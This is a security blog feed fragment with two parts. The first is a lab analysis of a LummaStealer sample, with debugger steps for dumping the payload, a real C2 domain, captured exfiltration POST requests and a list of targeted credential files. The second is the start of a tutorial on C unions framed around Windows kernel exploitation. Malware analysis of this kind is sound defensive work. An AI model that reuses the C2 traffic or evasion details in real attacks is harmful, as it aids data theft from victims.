&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Break just before the code buffer is called.
0:000&amp;gt; bu Project3+0x1a2c
0:000&amp;gt; g
...
Project3+0x1a2c:
00781a2c ffd0            call    eax {0040b610}

0:000&amp;gt; tr
0040b610 55              push    ebp

0:000&amp;gt; u
0040b610 55              push    ebp
0040b611 53              push    ebx
0040b612 57              push    edi
0040b613 56              push    esi
0040b614 81ec20020000    sub     esp,220h
0040b61a e8118f0300      call    00404530
0040b61f 84c0            test    al,al
0040b621 0f848e020000    je      0040b8b5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The injected code’s entrypoint is always at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer_addr+0xb610&lt;/code&gt;. We can now analyze the second stage, which is the LummaStealer binary.&lt;/p&gt;

&lt;p&gt;Before continuing, &lt;a href=&quot;https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/&quot;&gt;I recommend reading this article&lt;/a&gt;, which covers Lumma’s overall behaviors. Take note of the C2 logic and specific strings like “HWID.” Next, this sample was tested in an isolated lab running a fake HTTP webserver. At the time, I wasn’t aware that this was a Lumma sample, so the server returns junk data (a string of 256 “A” characters). The injected code requires &lt;em&gt;some&lt;/em&gt; data returned from the server, but at this time, I just haven’t tried any of the C2 responses as noted in the Microsoft article. This write-up could become a two-parter.&lt;/p&gt;

&lt;p&gt;Finally, a brief caveat: I chose to study this in a 32-bit context because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.scr&lt;/code&gt; files are 32 bits by nature. An analysis in a 64-bit context is likely overdue. The virtual machine used for analysis runs Windows 10, Build 19045 (22H2).&lt;/p&gt;

&lt;p&gt;Let me summarize the injected code’s “default” logic:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The malware loads crypt32.dll and winhttp.dll&lt;/li&gt;
  &lt;li&gt;An initial POST request is sent to the C2 server with the following POST body parameters: CID, HWID, and UID&lt;/li&gt;
  &lt;li&gt;A round of discovery occurs, where predefined registry keys and file paths are queried&lt;/li&gt;
  &lt;li&gt;The malware sends another POST request, but this time, a multipart body, which contains the same CID, UID, HWID, and now an encrypted body&lt;/li&gt;
  &lt;li&gt;Another round of discovery-and-POST’ing occurs&lt;/li&gt;
  &lt;li&gt;The application frees a buffer and gracefully exits&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It’s important to note that, during discovery, no changes to the registries or files occur. Additionally, the malware has a list of predefined hostnames. If none of them can be resolved, it sends a GET request to a Steam Community account, then gracefully exits.&lt;/p&gt;

&lt;p&gt;The connection uses HTTPS by default. This is enabled by the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest&quot;&gt;security flags used in the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winhttp!WinHttpOpenRequest&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;winhttp!WinHttpOpenRequest:
6f549660 8bff            mov     edi,edi
0:000&amp;gt; dd esp
03afed40  0040ee25 03bf3700 03afedc4 00450b76
03afed50  00000000 00000000 00000000 00800000 &amp;lt;-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dwFlags&lt;/code&gt; argument at ESP+0x1c is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WINHTTP_FLAG_SECURE&lt;/code&gt; flag, a constant value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt;. With HTTPS, it wouldn’t make the connection to my self-signed certificates, so I used a breakpoint to downgrade the requests to plaintext HTTP:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bu winhttp!WinHttpOpenRequest &quot;ed esp+0x1c 0; g&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The domains are always tested in the same order. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;falsiu[.]shop&lt;/code&gt; domain is always first. &lt;a href=&quot;https://threatfox.abuse.ch/ioc/1551652/&quot;&gt;Each domain is known to ThreatFox&lt;/a&gt; and is associated with the stealer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-ioc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The injected code is mostly spaghetti (obfuscation, defense evasion) and, because it runs in heap space, the debugger gets easily confused.&lt;/p&gt;

&lt;p&gt;You can slice it out for further analysis. These breakpoints helped with that process:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Get the size of the buffer.
bu Project3+0x18c5 &quot;r $t1 = poi(esp+8)&quot;

# Buffer allocation default path.
bu Project3+0x18c7 &quot;r $t0 = eax; g&quot;; 

# Buffer allocation if the first one failed.
bu Project3+0x18da &quot;r $t0 = eax; g&quot;; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, set one at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Project3+0x1a2c&lt;/code&gt; and run (or rerun) the dropper. Once it breaks, you can dump LummaStealer with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.writemem&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Write from (buffer_addr, buffer_addr+size-1).
.writemem C:\dump.bin $t0 $t0+$t1-1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This results in a file with a hash of:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;58fa589c19a85c7233e8fb2b2616672a1e6de8902456ddc63f89f6f0563c5ced
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one raises three times as many detections than the previous stage:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-vt-stg2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use a hex viewer to verify that the entrypoint offset 0x6b10 has the bytes we saw in the disassembly:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hexdump -X --skip 0xb610 dump.bin | head -n 1
000b610  55  53  57  56  81  ec  20  02  00  00  e8  11  8f  03  00  84
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can also use a tool like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pedis&lt;/code&gt; (PE disassembler) to confirm that this disassembles to the correct instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ pedis -r -e 0x400000 -o 0xb610 -m 32 dump.bin | head -n 10
b610:  55                 push ebp
b611:  53                 push ebx
b612:  57                 push edi
b613:  56                 push esi
b614:  81 ec 20 02 00 00  sub esp, 0x220
b61a:  e8 11 8f 03 00     call 0x444530
b61f:  84 c0              test al, al
b621:  0f 84 8e 02 00 00  jz 0x40b8b5
b627:  e8 b4 0a 03 00     call 0x43c0e0
b62c:  84 c0              test al, al
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The dump even has a valid PE header:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ readpe dump.bin
DOS Header
    Magic number:                    0x5a4d (MZ)
    Bytes in last page:              120
    Pages in file:                   1
    Relocations:                     0
    Size of header in paragraphs:    4
    Minimum extra paragraphs:        0
    Maximum extra paragraphs:        0
    Initial (relative) SS value:     0
    Initial SP value:                0
    Initial IP value:                0
    Initial (relative) CS value:     0
    Address of relocation table:     0x40
    Overlay number:                  0
    OEM identifier:                  0
    OEM information:                 0
    PE header offset:                0x78
PE header
    Signature:                       0x00004550 (PE)
COFF/File header
    Machine:                         0x14c IMAGE_FILE_MACHINE_I386
    Number of sections:              4
    Date/time stamp:                 1751033032 (Fri, 27 Jun 2025 14:03:52 UTC)
    Symbol Table offset:             0
    Number of symbols:               0
    Size of optional header:         0xe0
    Characteristics:                 0x102
    Characteristics names
                                         IMAGE_FILE_EXECUTABLE_IMAGE
                                         IMAGE_FILE_32BIT_MACHINE
Optional/Image header
    Magic number:                    0x10b (PE32)
    Linker major version:            14
    Linker minor version:            0
    Size of .text section:           0x49400
    Size of .data section:           0x8e00
    Size of .bss section:            0
    Entrypoint:                      0xb610
    Address of .text section:        0x1000
    Address of .data section:        0
    ImageBase:                       0x400000
    Alignment of sections:           0x1000
    Alignment factor:                0x200
    Major version of required OS:    6
    Minor version of required OS:    0
    Major version of image:          0
    Minor version of image:          0
    Major version of subsystem:      6
    Minor version of subsystem:      0
    Win32 version value:             0
        Overwrite OS major version:      (default)
        Overwrite OS minor version:      (default)
        Overwrite OS build number:       (default)
        Overwrite OS platform id:        (default)
    Size of image:                   0x5d000
    Size of headers:                 0x400
    Checksum:                        0
    Subsystem required:              0x2 (IMAGE_SUBSYSTEM_WINDOWS_GUI)
    DLL characteristics:             0x8540
    DLL characteristics names
                                         IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
                                         IMAGE_DLLCHARACTERISTICS_NX_COMPAT
                                         IMAGE_DLLCHARACTERISTICS_NO_SEH
                                         IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE
    Size of stack to reserve:        0x100000
    Size of stack to commit:         0x1000
    Size of heap space to reserve:   0x100000
    Size of heap space to commit:    0x1000
    Loader Flags:                    0
    Loader Flags names
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you try to load this as-is in Ghidra, it will read the header and try to resolve everything. But it won’t resolve anything correctly; you can prove that by observing that the entrypoint at offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xb610&lt;/code&gt; contains vastly different code. You can find the actual entrypoint by searching for the first eight bytes which comprise its instruction set, but the majority of the binary will not disassemble properly.&lt;/p&gt;

&lt;p&gt;To fix it, reimport the dump file with these settings:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Import as a RAW file with x86 (little endian) clang&lt;/li&gt;
  &lt;li&gt;Set the base address to the value of $t0 from the debugger&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-ghidra-stg2-import.png&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You still need to manually kick off the disassembly and create a function at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t0+0xb610&lt;/code&gt;, but this time, all of the references and function definitions throughout the binary will resolve correctly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-ghidra-init.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In addition, Ghidra should correctly decompile the switch statements. (There are many.)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-ghidra-switch-stmt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The disassembly and decompilation is not without its blind spots. First, all context of imported library functions is lost; the references appear only as their raw file addresses without labels. Second, because we also lose the stack and heap, the values of obfuscated call styles (calling registers or memory offsets) is also lost.&lt;/p&gt;

&lt;p&gt;An interesting obfuscation technique involves the use of a custom syscall wrapper. This is always located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t0+0x40000+0x5446&lt;/code&gt;. You can set a breakpoint prior to the main program’s execution for analysis:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bu Project3+0x1a2c &quot;bu $t0+0x00040000+0x5446; g&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Again, I chose to break at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1a2c&lt;/code&gt; because that’s the call site of the injected code.&lt;/p&gt;

&lt;p&gt;The call site uses its own custom logic to make syscalls directly instead of using the higher-level function wrappers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-ghidra-syscall.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$t0+0x40000+5446&lt;/code&gt; always calls the same wrapper:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-ghidra-syscall2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This breakpoint will pause on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtFileRead&lt;/code&gt; operations, &lt;a href=&quot;https://j00ru.vexillium.org/syscalls/nt/32/&quot;&gt;which have the syscall ID of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x8e&lt;/code&gt; on 32-bit Windows 10 22H2 versions&lt;/a&gt;, if you want to inspect any of the syscalls further:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bu Project3+0x1a2c &quot;bu $t0+0x00040000+0x5446 \&quot;.if (@eax != 0x8e) {gc} .else {r eax; p; dd poi(esp+0x18)}\&quot;; g&quot;; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As noted earlier, there are typically four rounds of communication before graceful exit. The first and last message is usually identical, with the exception that the HWID value appears in the fourth one:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# First...
POST /zpah? HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Length: 87
Host: falsiu.shop:443

uid=88b3b49f0a9eee8bc4a28fa4332343861e9d8e80adfdcc&amp;amp;cid=1a1c2c9f14d0b22156cd2760cec88517


# Fourth...
POST /zpah? HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Length: 125
Host: falsiu.shop:443

uid=88b3b49f0a9eee8bc4a28fa4332343861e9d8e80adfdcc&amp;amp;cid=1a1c2c9f14d0b22156cd2760cec88517&amp;amp;hwid=9C503F4AE14A40A1FC9088348D5AE88D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second and third messages contain encrypted data:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /zpah? HTTP/1.1
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=IbbvIj4Y4zG
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Length: 1218
Host: falsiu.shop:443

--IbbvIj4Y4zG
Content-Disposition: form-data; name=&quot;uid&quot;

88b3b49f0a9eee8bc4a28fa4332343861e9d8e80adfdcc
--IbbvIj4Y4zG
Content-Disposition: form-data; name=&quot;pid&quot;

1
--IbbvIj4Y4zG
Content-Disposition: form-data; name=&quot;hwid&quot;

9C503F4AE14A40A1FC9088348D5AE88D
--IbbvIj4Y4zG
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;data&quot;
Content-Type: application/octet-stream

&amp;lt; encrypted data... &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This follows some of the patterns observed in the Windows guide:&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;Lumma Stealer keeps track of the active C2 for sending the succeeding commands. Each command is sent to a single C2 domain that is active at that point. In addition, each C2 command contains one or more C2 parameters specified as part of the POST data as form data. The parameters are:&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;&lt;em&gt;act:&lt;/em&gt; Indicates the C2 command. Note: This C2 parameter no longer exists in Lumma version 6.&lt;/li&gt;
    &lt;li&gt;&lt;em&gt;ver:&lt;/em&gt; Indicates C2 protocol version. This value is always set to 4.0 and has never changed since the first version Lumma.&lt;/li&gt;
    &lt;li&gt;&lt;em&gt;lid&lt;/em&gt; (for version 5 and below)/&lt;em&gt;uid&lt;/em&gt; (for version 6): This ID identifies the Lumma client/operator and its campaign.&lt;/li&gt;
    &lt;li&gt;&lt;em&gt;j&lt;/em&gt; (for version 5 and below )/&lt;em&gt;cid&lt;/em&gt; (for version 6): This is an optional field that identifies additional Lumma features.&lt;/li&gt;
    &lt;li&gt;&lt;em&gt;hwid&lt;/em&gt;: Indicates the unique identifier for the victim machine.&lt;/li&gt;
    &lt;li&gt;&lt;em&gt;pid&lt;/em&gt;: Used in SEND_MESSAGE command to identify the source of the stolen data. A value of 1, indicates it came from the Lumma core process.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;My analysis only observed the UID (version 6), PID, and HWID parameters. Admittedly, I didn’t make time to play around with the C2 commands and their parameters. That could be the topic of another writeup.&lt;/p&gt;

&lt;p&gt;At the time of writing, it’s not clear to me what routine exactly is responsible for the encryption. The Microsoft guide underscores the use of ChaCha20, but it’s not a lead I chose to follow in the decompilation. Some of the more interesting files it looks for include Notepad++’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session.xml&lt;/code&gt;, Discord’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local State&lt;/code&gt;, and various Thunderbird and Outlook files. Given the breadth of files discovered, it would be interesting to see how much of that data is sent in these requests.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;https://attack.mitre.org/software/S1213/&quot;&gt;MITRE TTPs&lt;/a&gt; are consistent with prior findings, the observables serving as a subset of the official collection. We can summarize the findings here with a watered-down diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-killchain-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Fake torrents have been a means to spread malware for well over a decade. The links get reported, but there’s no real way to prevent it aside from not torrenting at all. A Reddit user explains their experience with a series of these, all of which have “SuccessfulCrab” in their titles:</summary></entry><entry><title type="html">C Unions in Windows kernel exploitation</title><link href="http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html" rel="alternate" type="text/html" title="C Unions in Windows kernel exploitation" /><published>2025-05-03T00:00:00-04:00</published><updated>2025-05-03T00:00:00-04:00</updated><id>http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation</id><content type="html" xml:base="http://localhost:4000/2025/05/03/C-Unions-in-Windows-kernel-exploitation.html">&lt;p&gt;Most people who learn C after a language like Python or JavaScript are stumped at the concept of the union, a native C data type. Unions look like structures, but their behavior couldn’t be farther from it. If C is meant to abstract raw assembly, the union is a subtle reminder that you are, at all times, just one step away from writing low-level code.&lt;/p&gt;

&lt;p&gt;This walkthrough will explore unions beyond the surface level. We’ll start with some basics, refer to specifications, then look at a few examples. We’re also going to look at how they appear in the Windows kernel, keeping an eye on offensive tradecraft.&lt;/p&gt;

&lt;h1 id=&quot;about-unions&quot;&gt;About Unions&lt;/h1&gt;

&lt;p&gt;Here’s a simple union definition:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_u&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This union has two fields: an integer &lt;em&gt;i&lt;/em&gt; and a byte &lt;em&gt;c&lt;/em&gt;. We can use it in code like such:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_u&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo.i: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will print &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo.i: 21&lt;/code&gt; to the console. The disassembly looks something like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    1139:       55                      push   rbp
    113a:       48 89 e5                mov    rbp,rsp
    113d:       48 83 ec 10             sub    rsp,0x10
    1141:       c7 45 fc 15 00 00 00    mov    DWORD PTR [rbp-0x4],0x15
    1148:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
    114b:       89 c6                   mov    esi,eax
    114d:       48 8d 05 b0 0e 00 00    lea    rax,[rip+0xeb0]
    1154:       48 89 c7                mov    rdi,rax
    1157:       b8 00 00 00 00          mov    eax,0x0
    115c:       e8 cf fe ff ff          call   1030 &amp;lt;printf@plt&amp;gt;
    1161:       b8 00 00 00 00          mov    eax,0x0
    1166:       c9                      leave
    1167:       c3                      ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This sets EAX to 0x15 (21).&lt;/p&gt;

&lt;p&gt;Now, let’s modify the main function to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; property:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo_u&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo.i: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo.c %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will print&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;foo.i: 21
foo.c: A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take another look at the disassembly:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    1139:       55                      push   rbp
    113a:       48 89 e5                mov    rbp,rsp
    113d:       48 83 ec 10             sub    rsp,0x10
    1141:       c7 45 fc 15 00 00 00    mov    DWORD PTR [rbp-0x4],0x15
    1148:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
    114b:       89 c6                   mov    esi,eax
    114d:       48 8d 05 b0 0e 00 00    lea    rax,[rip+0xeb0]
    1154:       48 89 c7                mov    rdi,rax
    1157:       b8 00 00 00 00          mov    eax,0x0
    115c:       e8 cf fe ff ff          call   1030 &amp;lt;printf@plt&amp;gt;
    1161:       c6 45 fc 41             mov    BYTE PTR [rbp-0x4],0x41
    1165:       0f b6 45 fc             movzx  eax,BYTE PTR [rbp-0x4]
    1169:       0f b6 c0                movzx  eax,al
    116c:       89 c6                   mov    esi,eax
    116e:       48 8d 05 9a 0e 00 00    lea    rax,[rip+0xe9a]
    1175:       48 89 c7                mov    rdi,rax
    1178:       b8 00 00 00 00          mov    eax,0x0
    117d:       e8 ae fe ff ff          call   1030 &amp;lt;printf@plt&amp;gt;
    1182:       b8 00 00 00 00          mov    eax,0x0
    1187:       c9                      leave
    1188:       c3                      ret
